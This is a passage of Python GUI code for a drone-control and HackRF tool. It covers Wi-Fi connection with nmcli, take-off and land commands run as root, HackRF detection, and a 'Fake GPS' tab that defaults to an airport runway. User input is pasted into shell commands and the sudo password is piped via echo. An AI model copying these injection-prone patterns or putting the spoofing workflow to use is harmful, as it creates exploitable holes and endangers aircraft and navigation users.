            return 'Not-Associated'
        else:
            return(str(p).split(' ')[17])
    except:
        return 'Disconnect'         
def status():
    if ConnectBssid()=='off/any' or ConnectBssid()=='Disconnect':
        return 'Disconnected'
    else:
        return 'Connected'
        
def updataWifiConnet():
    print(ConnectBssid())
    tab6_BSSID_CText(ConnectBssid())
    tab6_AP_CText(ConnectAP())
    tab6_Provider_CText(OtherDeviceName(ConnectAP()))
    tab6_Status_CText(status())

updataWifiConnet()

############################
### Tab6 Connect to wifi ###
############################

#def wificonnect(Bssid,interf,password=''):
def wificonnect(Bssid,password=''):
    #Start process bar
    PB_TabSix.start()
    #move to tab6
    note.select(tab6)
    
    #disable button
    tab6_ReConnect.config(state="disable")
    tab6_RunRos.config(state="disable")

    print('wifi connect start')
    if len(password)==0:
        cmd='nmcli d wifi connect ' + Bssid
    else:
        cmd='nmcli d wifi connect ' + Bssid +' password '+password
    getres= subprocess.Popen(cmd, shell = True, stdout=subprocess.PIPE).stdout.readlines()

    #End process bar
    PB_TabSix.stop()

    if str(getres).find('successfully')> 0:
        ret = 'Connected to the access point!'
        
        tab6_RunRos.config(state="normal")
        tab6_ReConnect.config(state="normal")
        note.select(tab6)
        MsgboxShowConnect = messagebox.showinfo("Status", ret)
    elif str(getres).find('failed')> 0:
        ret = 'Cannot connect to the access point!'
        MsgboxShowConnect = messagebox.showinfo("Status", ret)
    else:
        ret = 'No access point with BSSID found'
        MsgboxShowConnect = messagebox.showinfo("Status", ret)
    updataWifiConnet()
    return ret

###############################
### Tab6 Connect wifi Button###
###############################

def UpdateCommand():
    try:

        global DroneControlData
        searchFilename = ''.join(ConnectAP().split(':')[0:3])
        with open('DroneControlCMD/' + searchFilename + '.json') as json_file:
            DroneControlData = json.load(json_file)

        tab7_Provider_CText(DroneControlData["Company"])
        tab7_model_CText(DroneControlData["Drone"])

        goTab7()
    except:
        return False

RunRosIcon = PhotoImage(file = "Graphic/Control.png")
tab6_RunRos = Button(tab6,text="Drone Control",image=RunRosIcon,command=UpdateCommand,background = "black",foreground="#E4E4E4",font = ("Helvetica", 16, "bold"),relief="raised",compound="left",highlightbackground='black')
tab6_RunRos.place(x=600,y=400)


tab6_ReConnect = Button(tab6,text="Refresh          ",image=ab,command=updataWifiConnet,background = "black",foreground="#E4E4E4",font = ("Helvetica", 16, "bold"),relief="raised",compound="left",highlightbackground='black')
tab6_ReConnect.place(x=600,y=450)

###############################
### Tab7 Drone Control      ###
###############################
#all is for the tab7 title
DroneControl = PhotoImage(file = "Graphic/DroneControl.png")
DroneControlSet = Label(tab7, image = DroneControl,bg="black")
DroneControlSet.place(x=10, y=6, width=35, height=35)

tab7string = "Drone Control"
tab7_intro= Label(tab7,text=tab7string,background="black",foreground="yellow",
                  font=("Helvetica", 16, "bold"))
tab7_intro.place(x=42,y=10)

class tab7Label:
    def __init__(self,text,foreground,x,y):
        self = Label(tab7,text = text, background="black",foreground=foreground,font=("Helvetica", 16, "bold"))
        self.place(x=x,y=y)

tab7_Provider_lab    = tab7Label("Provider:"       ,"Green",46,50)
tab7_model_lab       = tab7Label("Model:"       ,"Green",46,90)


tab7_Provider_Ent = Entry(tab7,font=("Helvetica", 16, "bold"),foreground="Green", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab7_Provider_Ent.place(x=150,y=50 , width=400,height=30)

tab7_model_Ent = Entry(tab7,font=("Helvetica", 16, "bold"),foreground="Green", background="black",borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab7_model_Ent.place(x=150,y=90 , width=400,height=30)

tab7_Provider_Ent.configure(state='readonly')
tab7_model_Ent.configure(state='readonly')


def tab7_Provider_CText(Text):
    tab7_Provider_Ent.configure(state='normal')
    tab7_Provider_Ent.delete(0, END)
    tab7_Provider_Ent.insert(END,str(Text))
    tab7_Provider_Ent.configure(state='readonly')

def tab7_model_CText(Text):
    tab7_model_Ent.configure(state='normal')
    tab7_model_Ent.delete(0, END)
    tab7_model_Ent.insert(END,str(Text))
    tab7_model_Ent.configure(state='readonly')
    

###################################
### Tab7 Drone Control Function ###
###################################

#this class for launch ros can recall the function use multithread
class Tab7RosStart:
    def newThread(self):
        threading.Thread(target = self.Task1).start()
    def Task1(self):
        RosOnOffButton.configure(image=SwitchOn,foreground="Green")
        tab7Take_Off.config(state="normal")
        tab7Ftp.config(state="normal")
        tab7Land.config(state="normal")
        tab7openCam.config(state="normal")
        if DroneControlData["Launch Services Enable"] == True :

            try:
                if DroneControlData["Launch Services Root"] == True :
                    os.system('echo '+ SuPasswd +' |sudo -S xterm '+ DroneControlData["Launch Services"])
                else:
                    os.system('xterm '+ DroneControlData["Launch Services"])
            except:
                pass

            RosOnOffButton.configure(image=SwitchOFF,foreground="Red")
            tab7openCam.config(state="disable")
            tab7Ftp.config(state="disable")
            tab7Take_Off.config(state="disable")
            tab7Land.config(state="disable")

Tab7RosStartControl = Tab7RosStart()

#if ros is launched,off the function
#if ros off ,launch the function
def Tab7RosStartNow():
    
    for x in range(2):
            try:
                if DroneControlData["Mac Address type"] == ''.join(ConnectAP().split(':')[0:3]):
                    DroneControlData["Launch Services Enable"]

                    if str(RosOnOffButton.configure()).find('Red')>0:
                        Tab7RosStartControl.newThread()
                    elif str(RosOnOffButton.configure()).find('Green')>0:
                        if DroneControlData["Launch Services Enable"] == True :
	                        os.system('echo '+ SuPasswd +' |sudo -S pkill '+ DroneControlData["Launch Services"])
                        else:
                            RosOnOffButton.configure(image=SwitchOFF,foreground="Red")
                            tab7openCam.config(state="disable")
                            tab7Ftp.config(state="disable")
                            tab7Take_Off.config(state="disable")
                            tab7Land.config(state="disable")
                    break
                else:
                    UpdateCommand()
            except:
                UpdateCommand()
    else:
        if UpdateCommand() == False:
            goTab6()
            messagebox.showwarning("Warning","Please conform you have connect the drone")



def OPENCamera():#Opening Dorne camera <ROS>
    print('Message: Opening Dorne camera <ROS>')
    try:
        if DroneControlData["Open Camera Root"] == True :
            os.system('echo '+ SuPasswd +" |sudo -S gnome-terminal -x bash -c '" + DroneControlData["Open Camera"] + "'")
        else:
            os.system("gnome-terminal -x bash -c '" + DroneControlData["Open Camera"] + "'")
    except:
        messagebox.showwarning("Warning","No services provide")

def TakeOff():#Drone take off <ROS>
    print('Message: Drone take off <ROS>')
    try:
        if DroneControlData["Take Off Root"] == True :
            os.system('echo '+ SuPasswd +" |sudo -S gnome-terminal -x bash -c '" + DroneControlData["Take Off"] + "'")
        else:
            #os.system("gnome-terminal -x bash -c '" + DroneControlData["Take Off"] + "'")
            os.system(DroneControlData["Take Off"])
    except:
        messagebox.showwarning("Warning","No services provide")

def LandDown():#Drone land down <ROS>
    print('Message: Drone land down <ROS>')
    try:
        if DroneControlData["Land Down Root"] == True :
            os.system('echo '+ SuPasswd +" |sudo -S gnome-terminal -x bash -c '" + DroneControlData["Land Down"] + "'")
        else:
            #os.system("gnome-terminal -x bash -c '" + DroneControlData["Land Down"] + "'")
            os.system(DroneControlData["Land Down"])
    except:
        messagebox.showwarning("Warning","No services provide")


#FTP use command nautilus , nmap
def OpenFile():#Get drone file <FTP>
    print('Message: Get drone file <FTP>')
    if DroneControlData["FTP enable"] == True:
        FTPCMD = DroneControlData["FTP"].replace('<NetworkCard>',str(getConnect()))
        try:
            if DroneControlData["FTP Root"] == True :
                os.system('echo '+ SuPasswd +' |sudo -S gnome-terminal -x bash -c "' + FTPCMD + '"')
            else:
                os.system('gnome-terminal -x bash -c "' + FTPCMD + '"')

        except:
            messagebox.showwarning("Warning","No services provide")
    else:
        messagebox.showwarning("Warning","This drone not provide file services")

#################################
### Tab7 Drone Control Button ###
#################################

#tab7 drone ros camera button
Camera = PhotoImage(file="Graphic/camera.png")
tab7openCam = Button(tab7, text = "Open Camera",image=Camera,command=OPENCamera,
                 background = "black",foreground="red",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab7openCam.place(x=10,y=510)

#tab7 drone ftp use nmap to search the ftp ip and use ubuntu16.04 build in function to launch
UploadIcon = PhotoImage(file="Graphic/upload.png")
tab7Ftp = Button(tab7, text = "Open File",image=UploadIcon,command=OpenFile,
                 background = "black",foreground="#42c0fb",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab7Ftp.place(x=240,y=510)

#tab7 drone ros take off(up)
DroneUp = PhotoImage(file="Graphic/DroneUP.png")
tab7Take_Off = Button(tab7, text = "Take Off",image=DroneUp,command=TakeOff,
                 background = "black",foreground="Green",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab7Take_Off.place(x=450,y=510)

#tab7 drone ros Land Down(down)
DroneDown = PhotoImage(file="Graphic/DroneDown.png")
tab7Land = Button(tab7, text = "Land Down",image=DroneDown,command=LandDown,
                 background = "black",foreground="Green",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab7Land.place(x=630,y=510)

#if ros launch is off disable it
tab7openCam.config(state="disable")
tab7Ftp.config(state="disable")
tab7Take_Off.config(state="disable")
tab7Land.config(state="disable")

#to define the picture for launch ros button
SwitchOn = PhotoImage(file="Graphic/SwitchOn.png")
SwitchOFF = PhotoImage(file="Graphic/SwitchOff.png")

#for launch ros function
RosOnOffButton = Button(tab7, text = "ROS Launch",image=SwitchOFF,command=Tab7RosStartNow,
                 background = "black",foreground="Red",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
RosOnOffButton.place(x=615,y=450)
#################################
### Tab7 Drone Control Design ###
#################################

#all is for Tab7 design
DronePicture = PhotoImage(file = "Graphic/drone-Picture.png")
DronePictureSet = Label(tab7, image = DronePicture,bg="black")
DronePictureSet.place(x=450, y=50, width=300, height=300)

LaptopIcon2 = PhotoImage(file = "Graphic/laptop2.png")
LaptopIcon2Set = Label(tab7, image = LaptopIcon2,bg="black")
LaptopIcon2Set.place(x=50, y=300, width=170, height=170)

twoWayAllow2 = PhotoImage(file = "Graphic/two-way-allow.png")
twoWayAllowSet = Label(tab7, image = twoWayAllow2,bg="black")
twoWayAllowSet.place(x=350, y=250, width=100, height=79)

#############################################
### Tab8 HackRf One Select Layer          ###
#############################################

#all the design layer start
HackRFOneIcon = PhotoImage(file = "Graphic/HackRFOneIcon.png")
HackRFOneIconSet = Label(tab8, image = HackRFOneIcon,bg="black")
HackRFOneIconSet.place(x=10, y=6, width=35, height=35)

tab8Intro = "HackRF One Select"
tab8_lab_intro = Label(tab8,text = tab8Intro, background="black",foreground="#33ff02",
                       font=("Helvetica", 16, "bold"))
tab8_lab_intro.place(x=48,y=10)

tab8string = "  HackRF One"
tab8_intro= Label(tab8,text=tab8string,background="black",foreground="#E0E0E0",
                  font=('microsoft yahei', 80))
tab8_intro.place(x=42,y=73)

tab8string2 = "    GREAT SCOTT GADGETS"
tab8_intro2= Label(tab8,text=tab8string2,background="black",foreground="#E0E0E0",
                  font=('microsoft yahei', 40))
tab8_intro2.place(x=48,y=200)
#all the design layer end

#all hackrf one display string and entry start
class Tab8Label:
    def __init__(self,text,x,y):
        self = Label(tab8,text= text ,background="black",foreground="#c1ffb2",font=("Helvetica", 16, "bold")).place(x=x,y=y)

USBdescriptor = Tab8Label("USB descriptor string:", 42,350)
BoardID = Tab8Label("Board ID Number:", 42,380)
FirmwareVersion = Tab8Label("Firmware Version:", 42,410)
PartID = Tab8Label("Part ID Number:", 42,440)
SerialNumber = Tab8Label("Serial Number:", 42,470)

USBdescriptorInt = Entry(tab8,font=("Helvetica", 16, "bold"),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
USBdescriptorInt.place(x=280,y=350-3 , width=800,height=40)

BoardIDInt = Entry(tab8,font=("Helvetica", 16, "bold"),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
BoardIDInt.place(x=280,y=380-3 , width=800,height=40)

FirmwareVersionrInt = Entry(tab8,font=("Helvetica", 16, "bold"),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
FirmwareVersionrInt.place(x=280,y=410-3 , width=800,height=40)

PartIDInt = Entry(tab8,font=("Helvetica", 16, "bold"),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
PartIDInt.place(x=280,y=440-3 , width=800,height=40)

SerialNumberInt = Entry(tab8,font=("Helvetica", 16, "bold"),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
SerialNumberInt.place(x=280,y=470-3 , width=800,height=40)
#all hackrf one display string and entry end

#to dispay the status of HackRF ONE connection
HackRFONEYes = Label(tab8,text='     ✔ The Devices is connected' ,background="black",foreground="#73F959",font=("Helvetica", 16, "bold"))
HackRFONENo  = Label(tab8,text='✘ The Devices is  not connected' ,background="black",foreground="#F84646",font=("Helvetica", 16, "bold"))

#to change the display status
def HackRFONEChangeYes():
    HackRFONENo.place_forget()
    HackRFONEYes.place(x=170,y=515)

def HackRFONEChangeNo():
    HackRFONEYes.place_forget()
    HackRFONENo.place(x=170,y=515)

#first change all entry to normal &del all 
#cmd check hackrf one connection
#if have insrt data and change the dislay status to yes else change the dislay status to no 
#change all entry to readonly
def HackRfClear():
    USBdescriptorInt.configure(state='normal')
    BoardIDInt.configure(state='normal')
    FirmwareVersionrInt.configure(state='normal')
    PartIDInt.configure(state='normal')
    SerialNumberInt.configure(state='normal')

    USBdescriptorInt.delete(0, END)
    BoardIDInt.delete(0, END)
    FirmwareVersionrInt.delete(0, END)
    PartIDInt.delete(0, END)
    SerialNumberInt.delete(0, END)

    hackRFINFO = os.popen('hackrf_info').readlines()

    try:
        USBdescriptorInt.insert(0, str(str(hackRFINFO[1]).split(':')[1:])[3:-4])
        BoardIDInt.insert(0, str(str(hackRFINFO[2]).split(':')[1:])[3:-4])
        FirmwareVersionrInt.insert(0, str(str(hackRFINFO[3]).split(':')[1:])[3:-4])
        PartIDInt.insert(0, str(str(hackRFINFO[4]).split(':')[1:])[3:-4])
        SerialNumberInt.insert(0, str(str(hackRFINFO[5]).split(':')[1:])[3:-4])

        HackRFONEChangeYes()

    except:
        HackRFONEChangeNo()

    finally:
        USBdescriptorInt.configure(state='readonly')
        BoardIDInt.configure(state='readonly')
        FirmwareVersionrInt.configure(state='readonly')
        PartIDInt.configure(state='readonly')
        SerialNumberInt.configure(state='readonly')

#check all data when start
HackRfClear()

#this button to recheck the hackrf one status
HackRfRefresh = Button(tab8, text = "Refresh",image=ab,command=HackRfClear,
                 background = "black",foreground="#ffd381",
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
HackRfRefresh.config(highlightbackground='black')
HackRfRefresh.place(x=525,y=510)

#this button to goto fake gps page
GoToFakeGpsIcon = PhotoImage(file = "Graphic/FakeGpsIconButton.png")
GoToFakeGps = Button(tab8, text = "FakeGPS",image=GoToFakeGpsIcon,command=goTab9,
                 background = "black",foreground="#59C7F2",
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
GoToFakeGps.config(highlightbackground='black')
GoToFakeGps.place(x=685,y=510)

#can return the hackrf one connect status
#will double check
def getHackRfStatus():
    for x in range(2):
        try:
            if len(USBdescriptorInt.get()) > 0 and len(BoardIDInt.get()) > 0 and len(FirmwareVersionrInt.get()) > 0 and len(PartIDInt.get()) > 0 and len(SerialNumberInt.get()) > 0:
                return 'yes'
            else:
                HackRfClear()
        except:
            HackRfClear()
    return 'no'


#####################################
### Tab9 Gps data function        ###
#####################################
# for tab9 meaning:
# DD  => (decimal degrees)
# DMS => (degrees, minutes, seconds)

# GPS x & y find address
#url:https://nominatim.openstreetmap.org/
def GetGpsAddress(x,y):
    try:
        r = requests.get('https://nominatim.openstreetmap.org/reverse?format=json&accept-language=en&addressdetails=1&limit=1&lat=' + str(x) + '&lon=' + str(y), timeout=3)
        return r.json()['display_name']
    except:
        return 'no Value'

# address find GPS x & y
#api:https://nominatim.openstreetmap.org/search?
def GPSCoordinates(searchtxt):
    try:
        searchtxt = str(searchtxt).replace(" ", "%20")
        r = requests.get('https://nominatim.openstreetmap.org/search?format=json&accept-language=en&q='+searchtxt+'&addressdetails=1&limit=1', timeout=3)
        return format(float(r.json()[0]['lat']), '0.6f'),format(float(r.json()[0]['lon']), '0.6f')
    except:
        return 'no Value'

# DD change to DMS x
def DDtoDMS_x(number):
    try:
        num = float(number)
        d = int(num)
        m = int((num - d) * 60)
        s = (num - d - m/60) * 3600.00
        z= round(s, 2)
        if d >= 0:
            return "N "+str(abs(d))+"°"+str(abs(m))+"'"+str(abs(z))+'"'
        else:
            return "S "+str(abs(d))+"°"+str(abs(m))+"'"+str(abs(z))+'"'
        
    except:
        return ''
    

# DD change to DMS y
def DDtoDMS_y(number):
    try:
        num = float(number)
        d = int(num)
        m = int((num - d) * 60)
        s = (num - d - m/60) * 3600.00
        z= round(s, 2)
        if d >= 0:
            return "E "+str(abs(d))+"°"+str(abs(m))+"'"+str(abs(z))+'"'
        else:
            return "W "+str(abs(d))+"°"+str(abs(m))+"'"+str(abs(z))+'"'
    except:
        return ''

# this functionuse to find out the record gps bin data on the bacp up folder 
def FindBackUpGPSBin(GPSX,GPSY):
    try:
        SearchFileName = str(GPSX)+'a'+str(GPSY).replace('.','d')
        record = os.popen('ls -1 GpsBinSave/ |grep ' + SearchFileName + '|tail -1').readlines()[0][:-1]
        return record
    except:
        pass

#####################################
### Tab9 Fake  GPS Layer          ###
#####################################
#background image
FakeGpsImage = PhotoImage(file = "Graphic/GPSlocation.png")
FakeGpsImageSet = Label(tab9, image = FakeGpsImage,bg="black",borderwidth=0)
FakeGpsImageSet.place(x=100, y=26, width=656, height=304)

#Top icon image
FakeGpsIcon = PhotoImage(file = "Graphic/FakeGpsIcon.png")
FakeGpsIconSet = Label(tab9, image = FakeGpsIcon,bg="black",borderwidth=0)
FakeGpsIconSet.place(x=10, y=6, width=35, height=35)

#Top title sreing
tab9string = "Fake GPS"
tab9_intro= Label(tab9,text=tab9string,background="black",foreground="yellow",
                  font=("Helvetica", 16, "bold"))
tab9_intro.place(x=42,y=10)

#all string style
class Tab9Label:
    def __init__(self,text,x,y):
        self = Label(tab9,text = text , background="black",foreground="yellow",font=("Helvetica", 16, "bold")).place(x=x,y=y)

#all string for DD
dd  = Tab9Label("DD (decimal degrees):" ,20,340)
Latitude  = Tab9Label("Latitude:" ,20,380)
Longitude = Tab9Label("Longitude:",20,420)
Address  = Tab9Label("Address:",20,460)

#all string for DMS
DMS = Tab9Label("DMS (degrees, minutes, seconds):" ,400,340)
LatitudeDMS  = Tab9Label("Latitude:" ,400,380)
LongitudeDMS = Tab9Label("Longitude:",400,420)

#DD gps data entry
Latitude_Ent = Entry(tab9,font=("Helvetica", 16, "bold"),foreground="yellow", background="#1E1E1E", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
Latitude_Ent.place(x=140,y=380 , width=230,height=30)
Longitude_Ent = Entry(tab9,font=("Helvetica", 16, "bold"),foreground="yellow", background="#1E1E1E", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
Longitude_Ent.place(x=140,y=420 , width=230,height=30)

#DMS gps data entry
LatitudeDMS_Ent = Entry(tab9,font=("Helvetica", 16, "bold"),foreground="yellow", background="#1E1E1E", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
LatitudeDMS_Ent.place(x=520,y=380 , width=230,height=30)
LatitudeDMS_Ent.configure(state='readonly')
LongitudeDMS_Ent = Entry(tab9,font=("Helvetica", 16, "bold"),foreground="yellow", background="#1E1E1E", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
LongitudeDMS_Ent.place(x=520,y=420 , width=230,height=30)
LongitudeDMS_Ent.configure(state='readonly')

#to show or insertv address
Address_Ent = Entry(tab9,font=("Helvetica", 16, "bold"),foreground="yellow", background="#1E1E1E", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
Address_Ent.place(x=140,y=460 , width=700,height=30)

#update DMS function
#1 change state to normal
#2 del all and insert data
#3 change state to readonly
def updateXDMS():
    LatitudeDMS_Ent.configure(state='normal')
    LatitudeDMS_Ent.delete(0, END)
    LatitudeDMS_Ent.insert(END,str(DDtoDMS_x(str(Latitude_Ent.get()))))
    LatitudeDMS_Ent.configure(state='readonly')
def updateYDMS():
    LongitudeDMS_Ent.configure(state='normal')
    LongitudeDMS_Ent.delete(0, END)
    LongitudeDMS_Ent.insert(END,str(DDtoDMS_y(str(Longitude_Ent.get()))))
    LongitudeDMS_Ent.configure(state='readonly')

#Before update change entry color form red(#E55858) to black(#1E1E1E) 
def updateLatitudeDMS(event):
    Latitude_Ent.configure(background="#1E1E1E")
    updateXDMS()
def updateLongitudeDMS(event):
    Longitude_Ent.configure(background="#1E1E1E")
    updateYDMS()
def updateAddress(event):
    Address_Ent.configure(background="#1E1E1E")

#to launch function when input and click it
Latitude_Ent.bind('<Key>',updateLatitudeDMS)
Longitude_Ent.bind('<Key>',updateLongitudeDMS)
Address_Ent.bind('<Key>',updateAddress)
Latitude_Ent.bind('<Button-1>',updateLatitudeDMS)
Longitude_Ent.bind('<Button-1>',updateLongitudeDMS)
Address_Ent.bind('<Button-1>',updateAddress)

#processbar 
PB_TabNine = ttk.Progressbar(tab9,orient="horizontal",length=872,mode="indeterminate")
PB_TabNine.place(x=0,y=553)

#if no data will remove all form the DD_x,DD_y,address entry 
#elif no data will remove all and insert form the DD_x,DD_y,address entry
#finally change the color back to #1E1E1E
def RefershGPSData(x='',y='',address=''):
    Latitude_Ent.delete(0, END)
    Longitude_Ent.delete(0, END)
    Address_Ent.delete(0, END)

    Latitude_Ent.insert(END,str(x))
    Longitude_Ent.insert(END,str(y))
    Address_Ent.insert(END,str(address))

    updateXDMS()
    updateYDMS()

    Latitude_Ent.configure(background="#1E1E1E")
    Longitude_Ent.configure(background="#1E1E1E")
    Address_Ent.configure(background="#1E1E1E")

#at first update DMS_X,DMS_y data change them to #1E1E1E
#if all entry is emtry insert 'Hong Kong International Airport' data
#if only address input use the address to update the DD_x,DD_y and update the address
#if only DD_x,DD_y have value use it to search update address
#any incorrect entry will change to #E55858 other will change to #1E1E1E

def SearchGpsData():
    updateXDMS()
    updateYDMS()

    Latitude_Ent.configure(background="#1E1E1E")
    Longitude_Ent.configure(background="#1E1E1E")
    Address_Ent.configure(background="#1E1E1E")

    if len(Latitude_Ent.get().strip()) == 0 and len(Longitude_Ent.get().strip()) == 0 and len(Address_Ent.get().strip()) == 0 :
        RefershGPSData('22.304217','113.912238','South Runway Road, Kau Liu, Tung Chung, Islands District, New Territories, Hong Kong, China')
        messagebox.showwarning("Gps Search Function","Default information is inputed")

    elif len(Latitude_Ent.get().strip()) > 0 and len(Longitude_Ent.get().strip()) > 0 and len(Address_Ent.get().strip()) > 0 :
        messagebox.showwarning("Gps Search Function","All the data is completed")
    
    elif len(Latitude_Ent.get().strip()) == 0 and len(Longitude_Ent.get().strip()) == 0 and len(Address_Ent.get().strip()) > 0:#search by address
        value = GPSCoordinates(Address_Ent.get().strip())
        if value != 'no Value':
            Latitude_Ent.delete(0, END)
            Latitude_Ent.insert(END,value[0])

            Longitude_Ent.delete(0, END)
            Longitude_Ent.insert(END,value[1])

            Address_Ent.delete(0, END)
            Address_Ent.insert(END,GetGpsAddress(Latitude_Ent.get().strip(),Longitude_Ent.get().strip()))
            
        else:
            Address_Ent.configure(background="#E55858")
            messagebox.showwarning("Gps Search Function","The address is incorrect pleace insert correct informatiom.")
            

    elif len(Latitude_Ent.get().strip()) > 0 and len(Longitude_Ent.get().strip()) > 0 and len(Address_Ent.get().strip()) == 0 :
        value = GetGpsAddress(Latitude_Ent.get().strip(),Longitude_Ent.get().strip())
        if value != 'no Value':
            updateXDMS()
            updateYDMS()
            Address_Ent.delete(0, END)
            Address_Ent.insert(END,value)

        else:
            Latitude_Ent.configure(background="#E55858")
            Longitude_Ent.configure(background="#E55858")
            messagebox.showwarning("Gps Search Function","The GPS coordinates(Latitude & Longitude) is incorrect pleace insert correct informatiom.")

    
    elif len(Latitude_Ent.get().strip()) > 0 and len(Longitude_Ent.get().strip()) == 0 and len(Address_Ent.get().strip()) == 0 :
        Longitude_Ent.configure(background="#E55858")
        messagebox.showwarning("Gps Search Function","Please fill in the information of the Longitude.")


    elif len(Latitude_Ent.get().strip()) == 0 and len(Longitude_Ent.get().strip()) > 0 and len(Address_Ent.get().strip()) == 0 :
        Latitude_Ent.configure(background="#E55858")
        messagebox.showwarning("Gps Search Function","Please fill in the information of the Latitude.")


    else:
        messagebox.showwarning("Gps Search Function","Have some problem please input the correct information")
        pass

    updateXDMS()
    updateYDMS()


#if click enter or AutoComplete button can do this function 
def SearchGpsDataReturn(event):
    SearchGpsData()

Latitude_Ent.bind('<Return>',SearchGpsDataReturn)
Longitude_Ent.bind('<Return>',SearchGpsDataReturn)
Address_Ent.bind('<Return>',SearchGpsDataReturn)

AutoComplete1 = PhotoImage(file = "Graphic/AutoComplete.png")
tab9Update = Button(tab9, text = "Auto Complete",image=AutoComplete1,command=SearchGpsData,
                 background = "black",foreground="yellow",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab9Update.place(x=640,y=500)

#Gps record reader
#Can read the record
#if select can insert to the entry
def GPSRecordSelect():
    try:
        GPSRecord = Toplevel()
        GPSRecord.geometry('1250x260')
        GPSRecord.resizable(False,False)
        GPSRecord.configure(background='black')
        F1 = Frame(GPSRecord)
        Label(F1,text="GPS Record     ",background = 'black', fg = 'red',font=("Helvetica", 16, "bold")).pack(side = LEFT)
        Label(F1,text="Double click can insert the information to use",background = 'black', fg = 'yellow',font=("Helvetica", 16, "bold")).pack(side = RIGHT)
        F1.pack()
        tree = ttk.Treeview(GPSRecord,columns=['1','2','3'],show='headings')
        tree.column('1',width=120,anchor='center')
        tree.column('2',width=120,anchor='center')
        tree.column('3',width=1000,anchor='center')
        tree.heading('1',text='Latitude')
        tree.heading('2',text='Longitude')
        tree.heading('3',text='Address')
        tree.pack(side = BOTTOM)

        tree.tag_configure('GpsBinMaked', foreground='#16EC06',background='black')
        tree.tag_configure('normal', foreground='yellow',background='black')


        GpsRecordData = os.popen('cat GPSRecord.txt').readlines()

        tree.insert('','end',values=['Generated Record:','',''],tags = ('GpsBinMaked'))
        for x in GpsRecordData:
            save = re.split(r'_| ', str(x)[:-1])
            saveAdd = x[:-1].replace(save[0]+'_'+save[1],'')[1:]
            
            if FindBackUpGPSBin(save[0],save[1]) != None:
                tree.insert('','end',values=[save[0],save[1],saveAdd],tags = ('GpsBinMaked'))

        tree.insert('','end',values=['Non Generated:','',''],tags = ('normal'))

        if len(tree.get_children()) < 3 :
            for i in tree.get_children():
                tree.delete(i)

        for x in GpsRecordData:
            save = re.split(r'_| ', str(x)[:-1])
            saveAdd = x[:-1].replace(save[0]+'_'+save[1],'')[1:]

            if FindBackUpGPSBin(save[0],save[1]) == None:
                tree.insert('','end',values=[save[0],save[1],saveAdd],tags = ('normal'))



        def GetGpsData(event):
            if len(str(tree.item(tree.focus())['values'][2])) > 0:
                windowsMessage='Do you want to insert the following information?\n\nLatitude:'+tree.item(tree.focus())['values'][0]+'\nLongitude:'+tree.item(tree.focus())['values'][1]+'\n\nAddress:\n'+tree.item(tree.focus())['values'][2]
                if messagebox.askokcancel("Insert ask",windowsMessage) == 1:
                    RefershGPSData(str(tree.item(tree.focus())['values'][0]),str(tree.item(tree.focus())['values'][1]),str(tree.item(tree.focus())['values'][2]))
                    GPSRecord.destroy()

        tree.bind('<Double-1>',GetGpsData)

        def popUpMenu(event):
            tree.focus(tree.identify_row(event.y))
            selectItem = tree.identify_row(event.y)
            PhyValue=tree.item(selectItem)
            
            if len(PhyValue['values']) > 2:
                try:
                    popup.delete(0,100)
                    popup.add_command(label='Detail information:')
                    popup.add_separator()
                    popup.add_command(label='Address:')
                    popup.add_command(label=str(PhyValue['values'][2]))
                    popup.add_command(label='Latitude    (D/M/S)  :' + DDtoDMS_x(str(PhyValue['values'][0])))
                    popup.add_command(label='Longitude (D/M/S)  :' + DDtoDMS_y(str(PhyValue['values'][1])))
                    popup.tk_popup(int(event.x_root)-20,event.y_root, 0)

                finally:
                    popup.grab_release()

        tree.bind('<Button-3>',popUpMenu)
        GPSRecord.mainloop()
    except:
        pass


#To check the the save data
#if there are no record, save the data
def checkInsertRecord():
    if len(Latitude_Ent.get().strip()) > 0 and len(Longitude_Ent.get().strip()) > 0:
        cmd = "cat GPSRecord.txt |awk '{print $1}'|grep '"+ Latitude_Ent.get().strip() +"_"+ Longitude_Ent.get().strip() +"'"
        if subprocess.call(cmd, shell=True)!=0:
            address = GetGpsAddress(Latitude_Ent.get().strip(),Longitude_Ent.get().strip())
            if address != 'no Value':
                print('Have return code')
                os.system('echo "' + Latitude_Ent.get().strip() + '_' + Longitude_Ent.get().strip() + ' ' +str(address)+'" >>GPSRecord.txt')
                return
            else:
                messagebox.showwarning("error","Data can not insert")
                return
        else:
            messagebox.showwarning("error","Data have already insert")
            return
    else:
        messagebox.showwarning("error","Please fill in the value Latitude & Longitude")
        return

#to save the gps data
GpsSaveIcon = PhotoImage(file = "Graphic/save.png")
GpsSave = Button(tab9, text = "",image=GpsSaveIcon,command=checkInsertRecord,
                 background = "black",foreground="red",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
GpsSave.place(x=490,y=500, width=42,height=42)

#to view the gps Record
GpsRecordIcon = PhotoImage(file = "Graphic/Record.png")
tab9GpsRecord = Button(tab9, text = "",image=GpsRecordIcon,command=GPSRecordSelect,
                 background = "black",foreground="red",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab9GpsRecord.place(x=540,y=500, width=42,height=42)

#to remove all data form the entry
DeletIcon = PhotoImage(file = "Graphic/Delet.png")
